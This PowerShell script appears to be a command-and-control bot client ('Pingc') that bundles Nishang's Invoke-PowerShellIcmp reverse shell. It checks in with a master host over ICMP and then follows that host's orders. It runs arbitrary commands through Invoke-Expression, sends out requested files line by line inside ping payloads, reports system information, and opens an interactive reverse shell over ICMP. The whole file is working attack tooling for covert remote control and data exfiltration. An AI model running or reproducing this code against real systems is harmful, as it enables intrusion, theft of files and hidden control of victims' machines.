param (
    [string]$dest = $(throw "-option is required."),
    [int]$sleep = 10
)

function Invoke-PowerShellIcmp
{ 
<#
.SYNOPSIS
Nishang script which can be used for a Reverse interactive PowerShell from a target over ICMP. 

.DESCRIPTION
This script can receive commands from a server, execute them and return the result to the server using only ICMP.

The server to be used with it is icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh).

.PARAMETER IPAddress
The IP address of the server/listener to connect to.

.PARAMETER Delay
Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 

.PARAMETER BufferSize
The size of output Buffer. Defualt is 128.

.EXAMPLE
PS > Invoke-PowerShellIcmp-IPAddress 192.168.254.226

Above shows an example of an interactive PowerShell reverse connect shell. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html
https://github.com/samratashok/nishang
#>           
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    #Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True

    # Shell appearance and output redirection based on Powerfun - Written by Ben Turner & Dave Hardy
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    #Show an interactive PowerShell prompt
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        
        #Check for Command from the server
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            #Fragmant larger output into smaller ones to send to the server.
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length%$BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($remainingindex)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}


# check to see if the bot is actively checked in
# Read config file for test parameters
function Get-IniContent ($filePath)
{
    $ini = @{}
    switch -regex -file $FilePath
    {
        "^\[(.+)\]" # Section
        {
            $section = $matches[1]
            $ini[$section] = @{}
            $CommentCount = 0
        }
        "^(;.*)$" # Comment
        {
            $value = $matches[1]
            $CommentCount = $CommentCount + 1
            $name = "Comment" + $CommentCount
            $ini[$section][$name] = $value
        } 
        "(.+?)\s*=(.*)" # Key
        {
            $name,$value = $matches[1..2]
            $ini[$section][$name] = $value
        }
    }
    return $ini
}

function Get-SystemInfo 
{ 
  param($ComputerName = $env:ComputerName) 
  
      $header = 'Hostname','OSName','OSVersion','OSManufacturer','OSConfig','Buildtype', 'RegisteredOwner','RegisteredOrganization','ProductID','InstallDate', 'StartTime','Manufacturer','Model','Type','Processor','BIOSVersion', 'WindowsFolder' ,'SystemFolder','StartDevice','Culture', 'UICulture', 'TimeZone','PhysicalMemory', 'AvailablePhysicalMemory' , 'MaxVirtualMemory', 'AvailableVirtualMemory','UsedVirtualMemory','PagingFile','Domain' ,'LogonServer','Hotfix','NetworkAdapter' 
      systeminfo.exe /FO CSV /S $ComputerName |  
            Select-Object -Skip 1 |  
            ConvertFrom-CSV -Header $header 
} 



#bot checkin function
function CheckIn($dest){
    $id = 123456789
    write-host "[*] Checking in..."
    $checkin_str = "Checkin "
    $sysinfo = Get-SystemInfo
    $checkin_str += "Windows" + " "
    $checkin_str += $sysinfo.Hostname
    
    $enc = [system.Text.Encoding]::UTF8
    $data = $enc.GetBytes($checkin_str)
    $ping = New-Object System.Net.NetworkInformation.Ping
    $master_resp = $ping.Send($dest,1000,$data)
    $enc = [System.Text.Encoding]::ASCII
    $resp_data = $enc.GetString($master_resp.buffer)
    if ($resp_data -like "id=*") {
        $id_str = $resp_data.split("=")
        $id = $id_str[1]
        write-host "[*] Checked in...bot Id set to $id"
    }
    return $id
}

write-output "Pingc Powershell - connecting to Master at $dest"
#$config = Get-iniContent .\conf\pingc.ini
#$enc = [system.Text.Encoding]::UTF8
#if ($config["general"]["checkedin"] -eq 0){
#    CheckIn($dest)
#}

$id = 123456789
$filesSent = @()
while ($id -eq 123456789){
    $id = CheckIn($dest)
    Start-sleep -s $sleep
}
$ask_str = "What shall I do master? $id"

#main loop
while ($true){
    $enc = [system.Text.Encoding]::UTF8
    $data = $enc.GetBytes($ask_str)
    $ping = New-Object System.Net.NetworkInformation.Ping
    $master_resp = $ping.Send($dest,1000,$data)
    $enc = [System.Text.Encoding]::ASCII
    $resp_data = $enc.GetString($master_resp.buffer)
    $resp_data_array = $resp_data.Split(" ")
    $master_cmd = $resp_data_array[0]

    if ($master_cmd -eq "run"){
        $cmd = $resp_data_array | Where-Object { $_ –ne "run" }
        Invoke-Expression "$cmd"
    }
    elseif ($master_cmd -eq "sleep"){
        $sleep = $resp_data_array[1]
        write-host "[*] Setting sleep to $sleep seconds"
    }
    elseif ($master_cmd -eq "get"){
        $file = $resp_data_array | Where-Object { $_ –ne "get" }
        write-host "[*] Master says to get file: $file"
        if ($filesSent -contains $file){
            write-host "[*] File already sent..."
        }
        else {
            $fileStart = "(FILE_START) $id $file"
            $enc = [system.Text.Encoding]::UTF8
            $data = $enc.GetBytes($fileStart)
            $ping = New-Object System.Net.NetworkInformation.Ping
            $master_resp = $ping.Send($dest,1000,$data)
            $enc = [System.Text.Encoding]::ASCII
            $resp_data = $enc.GetString($master_resp.buffer)
            $content = Get-Content $file
            foreach ($line in $content)
            {
                $sendStr = "(FILE) $id $file $line"
                $enc = [system.Text.Encoding]::UTF8
                $data = $enc.GetBytes($sendStr)
                $ping = New-Object System.Net.NetworkInformation.Ping
                $master_resp = $ping.Send($dest,1000,$data)
            }
        
            $fileEnd = "(FILE_END) $id $file"
            $enc = [system.Text.Encoding]::UTF8
            $data = $enc.GetBytes($fileEnd)
            $ping = New-Object System.Net.NetworkInformation.Ping
            $master_resp = $ping.Send($dest,1000,$data)
            $enc = [System.Text.Encoding]::ASCII
            $resp_data = $enc.GetString($master_resp.buffer)
            $filesSent += $file
        }
    }
    elseif ($master_cmd -eq "sysinfo"){
        write-host "[*] Master says to get sysinfo"
        $sysinfo = Get-SystemInfo
        $sysinfo_str = "sysinfo $id "
        $sysinfo_str += "Windows" + " "
        $sysinfo_str += $sysinfo.Hostname
        
        $enc = [system.Text.Encoding]::UTF8
        $data = $enc.GetBytes($sysinfo_str)
        $ping = New-Object System.Net.NetworkInformation.Ping
        $master_resp = $ping.Send($dest,1000,$data)
        $enc = [System.Text.Encoding]::ASCII
        $resp_data = $enc.GetString($master_resp.buffer)
        write-host "[*] Master response: $resp_data"
    }
    elseif ($master_cmd -eq "shell"){
        write-host "[*] Master wants a shell, master gets a shell!"
        Invoke-PowershellICMP -IPAddress $dest
        #work on ICMP socket creation and IO into socket
        #$master = new-object system.net.ipendpoint([net.ipaddress]$dest,0)
        #$s = new-object system.net.sockets.socket(
        #    [Net.Sockets.AddressFamily]::InterNetwork,
        #    [Net.Sockets.SocketType]::Raw,
        #    [Net.Sockets.ProtocolType]::ICMP)
        #$s.bind((new-object system.net.ipendpoint([net.ipaddress]"10.125.216.17",0)))
        #$s.connect($master)
        #write-host $s.RemoteEndPoint
        #$byteIn = new-object byte[] 4
        #$byteOut = new-object byte[] 4
        #[void]$s.iocontrol([Net.Sockets.IOControlCode]::ReceiveAll,$byteIn,$byteOut)        
        #while ($true) {
        #    $buffer = new-object byte[] $s.ReceiveBufferSize
        #
        #    $enc = [system.Text.Encoding]::UTF8
        #    $shell_prompt = $enc.GetBytes("#")          
        #   write-host $s.SendTo($shell_prompt,$master)
        #    $s.ReceiveFrom($buffer,[ref]$master)
        #    write-host $buffer
        #}
    }

    write-host "[*] Sleeping..."
    Start-Sleep -s $sleep
}
